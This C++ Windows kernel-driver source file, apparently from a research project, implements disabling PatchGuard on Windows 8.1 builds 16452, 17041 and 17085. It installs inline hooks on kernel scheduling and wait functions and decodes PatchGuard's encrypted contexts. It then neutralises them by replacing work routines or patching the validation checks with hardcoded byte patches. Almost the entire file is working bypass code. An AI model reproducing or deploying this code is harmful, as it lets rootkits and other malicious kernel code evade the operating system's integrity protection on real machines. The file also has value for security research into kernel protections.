//
// This module implements the functions that used to disable PatchGuard on Win
// 8.1.
//
#include "stdafx.h"
#include "win8.h"
#include "exclusivity.h"
#include "util.h"
#include "../../Common/PgContext.h"


////////////////////////////////////////////////////////////////////////////////
//
// macro utilities
//


////////////////////////////////////////////////////////////////////////////////
//
// constants and macros
//

// true, when you want to monitor PatchGuard activities rather than stopping
// them completely.
static const bool WIN8_ENABLE_MONITORING_MODE = true;

// Change it to 0xCC when you want to break with patched code of
// KeDelayExecutionThread or KeWaitForSingleObject
static const UCHAR WIN8_HOOK_ENTRY_CODE = 0x90;

// Change it to 0xCC when you want to break with patched PatchGuard functions
static const UCHAR WIN8_PG_CONTEXT_HOOK_ENTRY_CODE = 0x90;

// Entry point code of FsRtlUninitializeSmallMcb. That can be gotten by reading
// an ntoskrnl.exe file image (not memory as it is in INIT section), but at this
// implementation, it was just hard coded as I was lazy.
static const ULONG64 WIN8_FsRtlUninitializeSmallMcb_PATTERN = 0xff5ff7e848ec8348;

// Offset in bytes from the top of KiScbQueueScanWorker to a return address of 
// a register function call in Pg_SelfEncryptWaitAndDecrypt. A more generic way 
// should be found.
static const ULONG WIN8_OFFSET_TO_Pg_SelfEncryptWaitAndDecrypt = 0x178;

// Code of a return address of KeDelayExecutionThread located in
// FsRtlMdlReadCompleteDevEx. It is used to determine if the thread is going to
// return to PatchGuard code. This check can be done by making sure that the
// return address is not in any image range as FsRtlMdlReadCompleteDevEx is
// always allocated on NonPaged memory.
static const ULONG64 WIN8_KeDelayExecutionThread_RETURN_CODE_PATTERN =
    0x000148858D4818EB;
// In order to update the value, look for this code on fairly begining of
// FsRtlMdlReadCompleteDevEx.
/*
INITKDBG:00000001406CA4E1 41 FF D1                                call    r9
INITKDBG:00000001406CA4E4 EB 18                                   jmp     short loc_1406CA4FE
INITKDBG:00000001406CA4E6                         ; ---------------------------------------------------------------------------
INITKDBG:00000001406CA4E6
INITKDBG:00000001406CA4E6                         loc_1406CA4E6:                          ; CODE XREF: Pg_FsRtlMdlReadCompleteDevEx+4D6j
INITKDBG:00000001406CA4E6 48 8D 85 48 01 00 00                    lea     rax, [rbp+148h]
*/

// Code of a return address of KeWaitForSingleObject located in
// FsRtlMdlReadCompleteDevEx. It is used to determine if the thread is going to
// return to PatchGuard code. This check can be done by making sure that the
// return address is not in any image range as FsRtlMdlReadCompleteDevEx is
// always allocated on NonPaged memory.
static const ULONG64 WIN8_KeWaitForSingleObject_RETURN_CODE_PATTERN =
    0x0F840F004539C033;
// In order to update the value, look for this code on fairly begining of
// FsRtlMdlReadCompleteDevEx.
/*
INITKDBG:00000001406CA4FB FF 55 78                                call    qword ptr [rbp+78h]
INITKDBG:00000001406CA4FE
INITKDBG:00000001406CA4FE                         loc_1406CA4FE:                          ; CODE XREF: Pg_FsRtlMdlReadCompleteDevEx+4CFj
INITKDBG:00000001406CA4FE                                                                 ; Pg_FsRtlMdlReadCompleteDevEx+4E4j
INITKDBG:00000001406CA4FE 33 C0                                   xor     eax, eax
INITKDBG:00000001406CA500 39 45 00                                cmp     [rbp+0], eax
INITKDBG:00000001406CA503 0F 84 0F 01 00 00                       jz      loc_1406CA618
*/

////////////////////////////////////////////////////////////////////////////////
//
// types
//

// A struct used as a parameter of Pg_IndependentContextWorkItemRoutine
struct Pg_IndependentContextWorkItemContext
{
    ULONG64 Unused0;
    ULONG64 Unused1;
    void(*FsUninitializeSmallMcb)(void*);
    ULONG64 PgContext;
};

// A struct used as a parameter of KiScbQueueScanWorker
struct Pg_KiScbQueueScanWorkerContext
{
    ULONG64 EncodedRoutine;
    ULONG64 EncodedPgContext;
    ULONG64 XorKey;
};


////////////////////////////////////////////////////////////////////////////////
//
// prototypes
//

EXTERN_C static
NTSTATUS Win8pInstallHooks(
    __in const Win8Symbols& Symbols);

EXTERN_C static
void Win8pInstallHook(
    __in ULONG_PTR PatchAddress,
    __in ULONG_PTR ReturnAddress,
    __in ULONG_PTR AsmHandler,
    __in ULONG_PTR AsmHandlerEnd);

EXTERN_C static
void Win8pInstallHook2(
    __in ULONG_PTR PatchAddress,
    __in ULONG_PTR AsmHandler);

EXTERN_C static
void Win8pDetectPatchGuardWorkItem(
    __inout WORK_QUEUE_ITEM* Item,
    __in ULONG64 CallerId);

EXTERN_C
ULONG_PTR Win8HandleKeDelayExecutionThread(
    __in ULONG_PTR* AddressOfReturnAddress);

EXTERN_C
ULONG_PTR Win8HandleKeWaitForSingleObject(
    __in ULONG_PTR* AddressOfReturnAddress);

EXTERN_C static
void Win8pPatchPgContext(
    __inout PgContext_8_1* PgContext);

EXTERN_C static
bool Win8pIsMonitoringModeEnabled();

EXTERN_C static
bool Win8pIsAccessibleAddress(
    __in void* Address);

EXTERN_C void AsmKiCommitThreadWait_16452();
EXTERN_C void AsmKiCommitThreadWait_17041();
EXTERN_C void AsmKiAttemptFastRemovePriQueue();
EXTERN_C void AsmPg_IndependentContextWorkItemRoutine();
EXTERN_C void AsmPg_IndependentContextWorkItemRoutineEnd();
EXTERN_C void AsmKeDelayExecutionThread();
EXTERN_C void AsmKeWaitForSingleObject_16452();
EXTERN_C void AsmKeWaitForSingleObject_17041();


////////////////////////////////////////////////////////////////////////////////
//
// variables
//

static Win8Symbols g_Symbols;


////////////////////////////////////////////////////////////////////////////////
//
// implementations
//

// Disable PatchGuard by installing hooks
ALLOC_TEXT(INIT, Win8DisablePatchGuard)
EXTERN_C
NTSTATUS Win8DisablePatchGuard(
    __in const Win8Symbols& Symbols)
{
    PAGED_CODE();

    g_Symbols = Symbols;

    // Is supported kernel version?
    switch (Symbols.KernelVersion)
    {
    case 17085:
    case 17041:
    case 16452:
        break;  // Yes
    default:
        return STATUS_INVALID_KERNEL_INFO_VERSION;  // No
    }

    auto status = Win8pInstallHooks(Symbols);
    return status;
}


// Install hooks to catch PatchGuard contexts
ALLOC_TEXT(INIT, Win8pInstallHooks)
EXTERN_C static
NTSTATUS Win8pInstallHooks(
    __in const Win8Symbols& Symbols)
{
    PAGED_CODE();

    auto exclusivity = std::experimental::unique_resource(
        ExclGainExclusivity(), ExclReleaseExclusivity);
    if (!exclusivity)
    {
        return STATUS_UNSUCCESSFUL;
    }

    // Install hook on the end of KiCommitThreadWait and
    // KiAttemptFastRemovePriQueue to examine return value that may be a Work
    // Item queued by PatchGuard
    if (Symbols.KernelVersion == 16452)
    {
        Win8pInstallHook2(
            Symbols.KiCommitThreadWait + 0x12a, 
            reinterpret_cast<ULONG_PTR>(AsmKiCommitThreadWait_16452));
    }
    else if (Symbols.KernelVersion == 17041 || 
             Symbols.KernelVersion == 17085)
    {
        Win8pInstallHook2(
            Symbols.KiCommitThreadWait + 0x12c, 
            reinterpret_cast<ULONG_PTR>(AsmKiCommitThreadWait_17041));
    }
    Win8pInstallHook2(
        Symbols.KiAttemptFastRemovePriQueue + 0x98,
        reinterpret_cast<ULONG_PTR>(AsmKiAttemptFastRemovePriQueue));

    // Install hook on the beginning of Pg_IndependentContextWorkItemRoutine to
    // catch Independent PatchGuard contexts
    const auto pg_IndependentContextWorkItemRoutine =
        Symbols.HalPerformEndOfInterrupt - 0x4c;
    Win8pInstallHook(
        pg_IndependentContextWorkItemRoutine,
        pg_IndependentContextWorkItemRoutine + 0x14,
        reinterpret_cast<ULONG_PTR>(AsmPg_IndependentContextWorkItemRoutine),
        reinterpret_cast<ULONG_PTR>(AsmPg_IndependentContextWorkItemRoutineEnd));

    // Install hook on the end of KeDelayExecutionThread and
    // KeWaitForSingleObject to examine a return address that may be somewhere
    // in PatchGuard functions.
    Win8pInstallHook2(
        Symbols.KeDelayExecutionThread + 0x6f,
        reinterpret_cast<ULONG_PTR>(AsmKeDelayExecutionThread));

    if (Symbols.KernelVersion == 16452)
    {
        Win8pInstallHook2(
            Symbols.KeWaitForSingleObject + 0x1dd, 
            reinterpret_cast<ULONG_PTR>(AsmKeWaitForSingleObject_16452));
    }
    else if (Symbols.KernelVersion == 17041 || 
             Symbols.KernelVersion == 17085)
    {
        Win8pInstallHook2(
            Symbols.KeWaitForSingleObject + 0x1c4, 
            reinterpret_cast<ULONG_PTR>(AsmKeWaitForSingleObject_17041));
    }

    return STATUS_SUCCESS;
}


// Modify AsmHandler to return to ReturnAddress at the end of that. Then
// install a hook on PatchAddress that redirects execution flow to AsmHandler.
ALLOC_TEXT(INIT, Win8pInstallHook)
EXTERN_C static
void Win8pInstallHook(
    __in ULONG_PTR PatchAddress,
    __in ULONG_PTR ReturnAddress,
    __in ULONG_PTR AsmHandler,
    __in ULONG_PTR AsmHandlerEnd)
{
    FixupAsmCode(ReturnAddress, AsmHandler, AsmHandlerEnd);
    InstallJump(PatchAddress, AsmHandler);
}


// Install a hook on PatchAddress that redirects execution flow to AsmHandler.
// The differences from Win8pInstallHook is that
//  1. This function overwrites only 13 bytes while the other is 17 bytes.
//  2. Overwrite code modifies one register (in this case RBX) while the other
//     does not.
//  3. AsmHandler implements all original code should be executed after the hook
//     function and does not have JMP to return to original code.
ALLOC_TEXT(INIT, Win8pInstallHook2)
EXTERN_C static
void Win8pInstallHook2(
    __in ULONG_PTR PatchAddress,
    __in ULONG_PTR AsmHandler)
{
    UCHAR patchCode[] =
    {
        WIN8_HOOK_ENTRY_CODE,                                       // nop or int 3
        0x48, 0xbb, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // mov     rbx, 0FFFFFFFFFFFFFFFFh
        0xFF, 0xe3,                                                 // jmp     rbx
    };
    C_ASSERT(sizeof(patchCode) == 13);

    // Replace placeholder (0xffffffffffffffff) located at offset 3 of patchCode
    // with AsmHandler
    *reinterpret_cast<ULONG_PTR*>(patchCode + 3) = AsmHandler;

    // And install patch
    PatchReal(reinterpret_cast<void*>(PatchAddress), patchCode, sizeof(patchCode));
}


// Gets called from AsmKiAttemptFastRemovePriQueue
EXTERN_C
void Win8HandleKiAttemptFastRemovePriQueue(
    __inout WORK_QUEUE_ITEM* Item)
{
    // It should be PASSIVE_LEVEL when it was called from ExpWorkerThread
    if (KeGetCurrentIrql() != PASSIVE_LEVEL)
    {
        return;
    }
    Win8pDetectPatchGuardWorkItem(Item, 1);
}


// Gets called from AsmKiCommitThreadWait
EXTERN_C
void Win8HandleKiCommitThreadWait(
    __inout WORK_QUEUE_ITEM* Item)
{
    // It should be PASSIVE_LEVEL when it was called from ExpWorkerThread
    if (KeGetCurrentIrql() != PASSIVE_LEVEL)
    {
        return;
    }
    Win8pDetectPatchGuardWorkItem(Item, 0);
}


// Determines if a Work Item is PatchGuard
ALLOC_TEXT(PAGED, Win8pDetectPatchGuardWorkItem)
EXTERN_C static
void Win8pDetectPatchGuardWorkItem(
    __inout WORK_QUEUE_ITEM* Item,
    __in ULONG64 CallerId)  // For debugging
{
    PAGED_CODE();

    // It should be by the SYSTEM process when it was called from
    // ExpWorkerThread
    if (PsGetCurrentProcessId() != reinterpret_cast<HANDLE>(4))
    {
        return;
    }

    // And of course, the Work Item should be valid. Be-aware, we are not
    // filtering DCP routines that may use a non-canonical address.
    if (Item < MmSystemRangeStart ||
        !Win8pIsAccessibleAddress(Item))
    {
        return;
    }

    if (Item->WorkerRoutine < MmSystemRangeStart ||
        !Win8pIsAccessibleAddress(Item->WorkerRoutine))
    {
        return;
    }

    // 0 = KiCommitThreadWait, 1 = KiAttemptFastRemovePriQueue
    //  It seems that the value is always 0 though
    if (CallerId == 1)
    {
        DBG_BREAK();
    }

    PgContext_8_1* pgContext = nullptr;

    // It is a PatchGuard context if the routine is KiScbQueueScanWorker
    if (reinterpret_cast<ULONG_PTR>(Item->WorkerRoutine)
        == g_Symbols.KiScbQueueScanWorker)
    {
        // Decode parameter by doing the same things as KiScbQueueScanWorker
        auto* param = reinterpret_cast<Pg_KiScbQueueScanWorkerContext*>(
            Item->Parameter);
        ULONG64 routine = param->EncodedRoutine ^ param->XorKey;
        ULONG64 context = param->EncodedPgContext ^ param->XorKey;
        DBG_PRINT("[%4x:%4x] PatchGuard %p :"
                  " KiScbQueueScanWorker (%p) was dequeued.\n",
            PsGetCurrentProcessId(), PsGetCurrentThreadId(),
            context, routine);

        pgContext = reinterpret_cast<PgContext_8_1*>(context);
    }
    // It is PatchGuard context if the routine is FsRtlUninitializeSmallMcb.
    else if (*reinterpret_cast<ULONG_PTR*>(Item->WorkerRoutine)
        == WIN8_FsRtlUninitializeSmallMcb_PATTERN)
    {
        DBG_PRINT("[%4x:%4x] PatchGuard %p :"
                  " FsRtlUninitializeSmallMcb (%p) was dequeued.\n",
            PsGetCurrentProcessId(), PsGetCurrentThreadId(),
            Item->Parameter, Item->WorkerRoutine);

        pgContext = reinterpret_cast<PgContext_8_1*>(Item->Parameter);
    }
    else
    {
        // Neither KiScbQueueScanWorker nor FsRtlUninitializeSmallMcb. benign.
        return;
    }

    if (Win8pIsMonitoringModeEnabled())
    {
        // Now, we have got a decrypted PatchGuard context that is about to be
        // fetched by ExpWorkerThread.
        Win8pPatchPgContext(pgContext);
    }
    else
    {
        // You can replace the routine with a harmless empty function instead of
        // modifying the PatchGuard context.
        Item->WorkerRoutine = [](void*){};
    }
}


// Gets called from AsmPg_IndependentContextWorkItemRoutine
EXTERN_C
void Win8HandlePg_IndependentContextWorkItemRoutine(
    __in Pg_IndependentContextWorkItemContext* Context)
{
    DBG_PRINT("[%4x:%4x] PatchGuard %p :"
              " Pg_IndependentContextWorkItemRoutine was called.\n",
        PsGetCurrentProcessId(), PsGetCurrentThreadId(),
        Context->PgContext);

    if (Win8pIsMonitoringModeEnabled())
    {
        // Now, we have got a decrypted PatchGuard context that is about to
        // execute Pg_IndependentContextWorkItemRoutine
        auto pgContext = reinterpret_cast<PgContext_8_1*>(Context->PgContext);
        Win8pPatchPgContext(pgContext);
    }
    else
    {
        // You can replace the routine with a harmless empty function instead of
        // modifying the PatchGuard context.
        Context->FsUninitializeSmallMcb = [](void*) {};
    }
}


// Gets called by AsmKeDelayExecutionThread, and returns one of following codes:
//  1. returning to Pg_SelfEncryptWaitAndDecrypt (PatchGuard)
//  2. returning to FsRtlMdlReadCompleteDevEx (PatchGuard)
//  0. returning to anywhere else (Not PatchGuard)
// AsmKeDelayExecutionThread returns the thread till ExpWorkerThead if the
// returned code is 1 or 2 rather than manipulating them. This is because the
// PatchGuard context may be encrypted on the fly and cannot be manipulated at
// that moment.
ALLOC_TEXT(PAGED, Win8HandleKeDelayExecutionThread)
EXTERN_C
ULONG_PTR Win8HandleKeDelayExecutionThread(
    __in ULONG_PTR* AddressOfReturnAddress)
{
    PAGED_CODE();
    const auto pg_SelfEncryptWaitAndDecrypt = g_Symbols.KiScbQueueScanWorker
        + WIN8_OFFSET_TO_Pg_SelfEncryptWaitAndDecrypt;

    auto returnAddr = *AddressOfReturnAddress;

    // Check if the thread is going to return to Pg_SelfEncryptWaitAndDecrypt
    if (returnAddr == pg_SelfEncryptWaitAndDecrypt)
    {
        DBG_PRINT("[%4x:%4x] PatchGuard ???????????????? :"
                  " KeDelayExecutionThread is returning to"
                  " Pg_SelfEncryptWaitAndDecrypt (%p).\n",
            PsGetCurrentProcessId(), PsGetCurrentThreadId(),
            returnAddr);
        //DBG_BREAK();
        return 1;
    }

    // Check if the thread is going to return to FsRtlMdlReadCompleteDevEx
    if (*reinterpret_cast<ULONG64*>(returnAddr)
        == WIN8_KeDelayExecutionThread_RETURN_CODE_PATTERN)
    {
        DBG_PRINT("[%4x:%4x] PatchGuard ???????????????? :"
                  " KeDelayExecutionThread is returning to"
                  " FsRtlMdlReadCompleteDevEx (%p).\n",
            PsGetCurrentProcessId(), PsGetCurrentThreadId(),
            returnAddr);
        //DBG_BREAK();
        return 2;
    }

    // It is not a PatchGuard
    return 0;
}


// Gets called by AsmKeWaitForSingleObject, and returns one of following codes:
//  1. returning to FsRtlMdlReadCompleteDevEx (PatchGuard)
//  0. returning to anywhere else (Not PatchGuard)
// AsmKeWaitForSingleObject returns the thread till ExpWorkerThead if the
// returned code is 1 rather than manipulating them. This is because the
// PatchGuard context may be encrypted on the fly and cannot be manipulated at
// that moment.
EXTERN_C
ULONG_PTR Win8HandleKeWaitForSingleObject(
    __in ULONG_PTR* AddressOfReturnAddress)
{
    auto returnAddr = *AddressOfReturnAddress;

    // Check if the thread is going to return to FsRtlMdlReadCompleteDevEx
    if (*reinterpret_cast<ULONG_PTR*>(returnAddr)
        == WIN8_KeWaitForSingleObject_RETURN_CODE_PATTERN)
    {
        DBG_PRINT("[%4x:%4x] PatchGuard ???????????????? :"
                  " KeWaitForSingleObject is returning to"
                  " FsRtlMdlReadCompleteDevEx (%p).\n",
            PsGetCurrentProcessId(), PsGetCurrentThreadId(),
            returnAddr);
        //DBG_BREAK();
        return 1;
    }

    // It is not a PatchGuard
    return 0;
}


// Modifies PatchGuard context (its value field and code) to disarm them.
// Note that this function is not necessary if you just want to stop PatchGuard.
// Thus, a lots of magic numbers in this function is just for presentation.
EXTERN_C static
void Win8pPatchPgContext(
    __inout PgContext_8_1* PgContext)
{
    // There are several condition checks in FsRtlMdlReadCompleteDevEx and
    // Pg_SelfValidation to see the result of validation check. Following
    // addresses are these addresses and will be modified.
    auto fsRtlUninitializeSmallMcb = reinterpret_cast<ULONG_PTR>(PgContext)
        + PgContext->offsetToFsUninitializeSmallMcbInBytes;
    auto fsRtlMdlReadCompleteDevEx = fsRtlUninitializeSmallMcb - 0xa000;
    auto fsResultCheck1 = fsRtlMdlReadCompleteDevEx + 0x90cd;
    auto fsResultCheck2 = fsRtlMdlReadCompleteDevEx + 0x92e1;
    auto pgSelfValidation = reinterpret_cast<ULONG_PTR>(PgContext)
        + PgContext->offsetToPg_SelfValidationInBytes;
    auto pgResultCheck = pgSelfValidation + 0x423;

    //DBG_BREAK();

    // Install patches on PatchGuard code
    static const UCHAR patch1[] =
    {
        WIN8_PG_CONTEXT_HOOK_ENTRY_CODE, 0x90, 0x90, 0x90, 0x90, 0x90,
    };
    PatchReal(reinterpret_cast<void*>(fsResultCheck1), patch1, sizeof(patch1));

    static const UCHAR patch2[] =
    {
        WIN8_PG_CONTEXT_HOOK_ENTRY_CODE, 0x0F, 0x85, 0x6D, 0x04,
    };
    PatchReal(reinterpret_cast<void*>(fsResultCheck2), patch2, sizeof(patch2));

    static const UCHAR patch3[] =
    {
        WIN8_PG_CONTEXT_HOOK_ENTRY_CODE, 0xe9, 0x09, 0x02,
    };
    PatchReal(reinterpret_cast<void*>(pgResultCheck), patch3, sizeof(patch3));


    // When ((the value & 2) == true), PatchGuard does self runtime
    // en(de)cryption. I do not want PatchGuard to do that for the sake of
    // debugging. It can be deleted.
    //PgContext->onTheFlyEnDecryptionFlag &= 0xFFFFFFFD;

    // When the value is not 0xFFFFFFFF, PatchGuard does Win32k verification.
    // I do not want PatchGuard to do that because when an error is detected
    // during Win32k validation, PatchGuard goes to BugCheck without calling
    // a necessary function (to be precise, MmDetachSession) to be a neutral
    // state.
    PgContext->checkWin32kIfNotNegativeOne = 0xFFFFFFFF;
}


// Return if Monitoring Mode is enabled or not (disabling mode)
EXTERN_C static
bool Win8pIsMonitoringModeEnabled()
{
    return WIN8_ENABLE_MONITORING_MODE;
}


// Return true if the address is accessible
ALLOC_TEXT(PAGED, Win8pIsAccessibleAddress)
EXTERN_C static
bool Win8pIsAccessibleAddress(
    __in void* Address)
{
    PAGED_CODE();
    const auto pxe = MiAddressToPxe(Address);
    const auto ppe = MiAddressToPpe(Address);
    const auto pde = MiAddressToPde(Address);
    const auto pte = MiAddressToPte(Address);
    if ((!pxe->Valid) ||
        (!ppe->Valid) ||
        (!pde->Valid) ||
        (!pde->LargePage && (!pte || !pte->Valid)))
    {
        return false;
    }
    return true;
}

